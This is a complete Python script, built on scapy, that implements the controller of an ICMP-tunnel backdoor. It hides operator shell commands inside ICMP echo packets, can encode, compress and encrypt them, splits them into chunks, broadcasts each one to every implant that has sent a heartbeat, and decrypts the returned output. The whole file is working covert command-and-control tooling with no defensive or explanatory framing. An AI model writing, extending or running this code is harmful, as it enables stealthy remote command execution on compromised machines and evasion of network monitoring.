#!/usr/bin/env python3
"""
ICMP Command Server with full options
"""
from scapy.all import IP, ICMP, Raw, sniff, send
import argparse
import time
import threading
from collections import defaultdict
import base64
import zlib
from cryptography.fernet import Fernet

# Default configuration
DEFAULT_ICMP_ID = 13170
DEFAULT_TTL = 64
DEFAULT_CHUNK_SIZE = 500

class CommandServer:
    def __init__(self, args):
        self.args = args
        self.sequence_num = 0
        self.connected_listeners = {}
        self.running = True
        self.encryption_enabled = False
        self.cipher = None
        
        # Setup encryption if enabled
        if args.encrypt and args.key:
            try:
                self.cipher = Fernet(args.key.encode())
                self.encryption_enabled = True
                print("[+] Encryption enabled")
            except:
                print("[-] Invalid encryption key")
        
    def encrypt_data(self, data):
        """Encrypt data if enabled"""
        if self.encryption_enabled and self.cipher:
            return self.cipher.encrypt(data.encode()).decode('latin-1')
        return data
    
    def decrypt_data(self, data):
        """Decrypt data if enabled"""
        if self.encryption_enabled and self.cipher:
            try:
                return self.cipher.decrypt(data.encode('latin-1')).decode()
            except:
                return f"[DECRYPTION_ERROR] {data}"
        return data
    
    def encode_data(self, data):
        """Encode data based on selected method"""
        if self.args.encoding == "base64":
            data = base64.b64encode(data.encode()).decode()
        elif self.args.encoding == "hex":
            data = data.encode().hex()
        
        if self.args.compress:
            data = base64.b64encode(zlib.compress(data.encode())).decode()
        
        return data
    
    def decode_data(self, data):
        """Decode data based on selected method"""
        if self.args.compress:
            try:
                data = zlib.decompress(base64.b64decode(data)).decode()
            except:
                pass
        
        if self.args.encoding == "base64":
            data = base64.b64decode(data).decode(errors='ignore')
        elif self.args.encoding == "hex":
            data = bytes.fromhex(data).decode(errors='ignore')
        
        return data
    
    def send_command(self, target_ip, command):
        """Send a command to a listener"""
        try:
            # Encode and encrypt the command
            encoded_cmd = self.encode_data(command)
            encrypted_cmd = self.encrypt_data(encoded_cmd)
            
            # Split into chunks if needed
            chunks = [encrypted_cmd[i:i+self.args.chunk_size] 
                     for i in range(0, len(encrypted_cmd), self.args.chunk_size)]
            
            # Send each chunk
            for i, chunk in enumerate(chunks):
                payload = (IP(dst=target_ip, ttl=self.args.ttl)/
                          ICMP(type=8, id=self.args.icmp_id, seq=self.sequence_num)/
                          Raw(load=f"{i}:{len(chunks)}:{chunk}"))
                
                send(payload, verbose=0)
                self.sequence_num = (self.sequence_num + 1) % 65535
                time.sleep(0.1)
            
            print(f"[+] Command sent to {target_ip}")
            
        except Exception as e:
            print(f"[-] Error sending command: {e}")

    def process_packet(self, pkt):
        """Process incoming ICMP packets"""
        try:
            if not (pkt.haslayer(IP) and pkt.haslayer(ICMP) and pkt.haslayer(Raw)):
                return
                
            if pkt[ICMP].id != self.args.icmp_id:
                return
                
            src_ip = pkt[IP].src
            raw_data = pkt[Raw].load.decode('utf-8', errors='ignore')
            
            # Handle heartbeats
            if pkt[ICMP].type == 8 and raw_data.startswith("HEARTBEAT"):
                self.connected_listeners[src_ip] = time.time()
                print(f"[+] Heartbeat from {src_ip}")
                return
                
            # Handle command responses
            if pkt[ICMP].type == 0:
                if src_ip in self.connected_listeners:
                    try:
                        # Handle chunked responses
                        if ':' in raw_data:
                            parts = raw_data.split(':', 2)
                            if len(parts) == 3:
                                chunk_num, total_chunks, data = parts
                                # For simplicity, just print each chunk
                                decrypted_data = self.decrypt_data(data)
                                decoded_data = self.decode_data(decrypted_data)
                                print(decoded_data, end='', flush=True)
                        else:
                            decrypted_data = self.decrypt_data(raw_data)
                            decoded_data = self.decode_data(decrypted_data)
                            print(decoded_data, end='', flush=True)
                    except Exception as e:
                        print(f"[-] Error processing response: {e}")
                    
        except Exception as e:
            print(f"[-] Error processing packet: {e}")

    def start_sniffer(self):
        """Start sniffing for ICMP packets"""
        try:
            sniff(iface=self.args.interface, prn=self.process_packet, 
                  filter="icmp", store=0, stop_filter=lambda x: not self.running)
        except Exception as e:
            print(f"[-] Sniffer error: {e}")

    def cleanup_listeners(self):
        """Remove old listeners"""
        current_time = time.time()
        for ip in list(self.connected_listeners.keys()):
            if current_time - self.connected_listeners[ip] > 30:
                del self.connected_listeners[ip]
                print(f"[-] Listener {ip} timed out")

    def get_active_listeners(self):
        """Get currently connected listeners"""
        self.cleanup_listeners()
        return list(self.connected_listeners.keys())

    def start(self):
        """Start the command server"""
        print(f"[+] ICMP Command Server started on {self.args.interface}")
        print(f"[+] ICMP ID: {self.args.icmp_id}")
        print(f"[+] Encoding: {self.args.encoding}")
        print(f"[+] Compression: {'Enabled' if self.args.compress else 'Disabled'}")
        print(f"[+] Encryption: {'Enabled' if self.encryption_enabled else 'Disabled'}")
        print(f"[+] Chunk size: {self.args.chunk_size} bytes")
        print("[+] Type 'list' to see connected listeners")
        print("[+] Type 'exit' to quit")
        
        # Start sniffer in background thread
        sniffer_thread = threading.Thread(target=self.start_sniffer, daemon=True)
        sniffer_thread.start()
        
        try:
            while self.running:
                try:
                    command = input("shell> ").strip()
                    
                    if command.lower() == 'exit':
                        break
                    elif command.lower() == 'list':
                        listeners = self.get_active_listeners()
                        if listeners:
                            print("\nConnected listeners:")
                            for ip in listeners:
                                print(f"  - {ip}")
                            print()
                        else:
                            print("No listeners connected\n")
                    elif command:
                        # Send command to all connected listeners
                        listeners = self.get_active_listeners()
                        if listeners:
                            for ip in listeners:
                                self.send_command(ip, command)
                        else:
                            print("[-] No listeners connected")
                            
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    print(f"[-] Error: {e}")
                    
        finally:
            self.running = False
            print("[+] Server stopped")

def main():
    parser = argparse.ArgumentParser(description="ICMP Command Server")
    parser.add_argument('-i', '--interface', required=True, help="Network interface")
    parser.add_argument('--icmp-id', type=int, default=DEFAULT_ICMP_ID, 
                       help=f"ICMP ID (default: {DEFAULT_ICMP_ID})")
    parser.add_argument('--ttl', type=int, default=DEFAULT_TTL,
                       help=f"IP TTL (default: {DEFAULT_TTL})")
    parser.add_argument('--encoding', choices=['plain', 'base64', 'hex'], default='plain',
                       help="Data encoding method")
    parser.add_argument('--compress', action='store_true', help="Enable compression")
    parser.add_argument('--encrypt', action='store_true', help="Enable encryption")
    parser.add_argument('--key', help="Encryption key (required if --encrypt is used)")
    parser.add_argument('--chunk-size', type=int, default=DEFAULT_CHUNK_SIZE,
                       help=f"Chunk size in bytes (default: {DEFAULT_CHUNK_SIZE})")
    
    args = parser.parse_args()
    
    if args.encrypt and not args.key:
        parser.error("--encrypt requires --key")
    
    server = CommandServer(args)
    server.start()

if __name__ == "__main__":
    main()